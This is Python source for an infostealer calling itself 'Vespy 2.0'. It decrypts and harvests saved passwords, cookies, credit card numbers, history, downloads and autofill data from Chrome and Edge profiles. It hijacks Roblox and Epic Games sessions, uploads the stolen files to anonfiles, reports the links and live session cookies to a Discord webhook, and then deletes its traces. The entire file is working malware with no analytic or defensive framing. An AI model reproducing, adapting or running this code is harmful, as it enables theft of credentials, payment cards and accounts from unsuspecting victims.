class CookieInfo():
    def __init__(self, Cookies: str):
        if "Name : .ROBLOSECURITY" in Cookies:
            cookie = Cookies.split("\n"+"="*50)
            for i in cookie:
                if "ROBLOSECURITY" in i:
                    self.RobloxInfo(i.split("Value : ")[1].replace(" ",""))
        if "EPIC_CLIENT_SESSION" and "EPIC_SSO" in Cookies:
            cookies = Cookies.split("\n"+"="*50)
            ESC = []
            ES = []
            for i in cookies:
                if "EPIC_CLIENT_SESSION" in i:
                    ESC.append(i.split("Value : ")[1].replace(" ",""))
            for i in cookies:
                if "EPIC_SSO" in i:
                    ES.append(i.split("Value : ")[1].replace(" ",""))
            for i in range(len(ESC)):
                try:
                    self.EpicInfo(ESC[i],ES[i])
                except:pass

    def EpicInfo(self, ESC, ES):
        r=requests.get("https://www.epicgames.com/account/personal?lang=en&productName=epicgames",cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).text
        r2 = requests.get("https://www.epicgames.com/account/v2/payment/ajaxGetWalletBalance",cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).json()
        displayname = r.split('"displayName":{"value":"')[1].split('"')[0]
        ID = r.split('"userInfo":{"id":{"value":"')[1].split('"')[0]
        balance = r2['walletBalance']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"EPIC Games Cookies", description=f"Grabbed Epic Games Account", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Account of {displayname}\n", value=f":id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``")
        webhook.add_embed(embed)
        webhook.execute()

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
            embed.set_thumbnail(url=r['ThumbnailUrl'])
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.Cookies = "-"
        self.Passwords = "-"
        self.History = "-"
        self.Downloads = "-"
        self.CCs = "-"
        self.Autofill = "-"
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for i in paths:
            if os.path.exists(i):
                try:
                    key = self._key(os.path.join(i, "Local State"))
                    self.cookies(i, key)
                    self.passwords(i, key)
                    self.history(i)
                    self.downloads(i)
                    self.ccs(i, key)
                    self.autofill(i)
                except:
                    pass
        t1 = Thread(target=self._upload)
        t2 = Thread(target=CookieInfo,args=([self.Cookies]))
        t1.start();t2.start()
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Network", "Cookies")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
                        host_key, name, encrypted_value = V
                        dec = self._decrypt(encrypted_value,key)
                        self.Cookies += "="*50+f"\nHost : {host_key}\nName : {name}\nValue : {dec}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Cookies.encode())
        f.close()
    
    def passwords(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Login Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Login Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                        url, name, password = V
                        dec = self._decrypt(password,key)
                        self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                    for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins order by date_created").fetchall():
                        url, name, password = V
                        dec = self._decrypt(password,key)
                        self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "History")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                        url, title, count, last_visit = V
                        if url and title and count and last_visit != "":
                            if len(self.History) < 100000:
                                self.History += "="*50+f"\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n"
                        else:break
                cursor.close()
                con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "History")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "History2"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History2")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                        url, path = V
                        self.Downloads += "="*50+f"\nURL : {url}\nPath : {path}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Web Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT name, value FROM autofill").fetchall():
                        name, value = V
                        self.Autofill += "="*50+f"\nName : {name}\nValue : {value}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Web Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                        name, exp_month, exp_year, cne = V
                        cn = self._decrypt(cne,key)
                        self.CCs += "="*50+f"\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()

    def _upload(self):
        try:
            apdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            PasswordSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"rb")}).json()['data']['file']['url']['full']
            CookieSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"rb")}).json()['data']['file']['url']['full']
            CredsSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"rb")}).json()['data']['file']['url']['full']
            HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"rb")}).json()['data']['file']['url']['full']
            DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"rb")}).json()['data']['file']['url']['full']
            AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"rb")}).json()['data']['file']['url']['full']
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
            embed = DiscordEmbed(title=f"Browser Stealer", description=f"Found Information About Browsers", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n")
            webhook.add_embed(embed)
            webhook.execute()
            try:
                os.remove(os.path.join(apdata, "Cookies.txt"));os.remove(os.path.join(apdata, "Passw.txt"));os.remove(os.path.join(apdata, "credsc.txt"));os.remove(os.path.join(apdata, "Histo.txt"));os.remove(os.path.join(apdata, "Downs.txt"));os.remove(os.path.join(apdata, "Autofill.txt"))
            except:
                pass
        except:
            pass
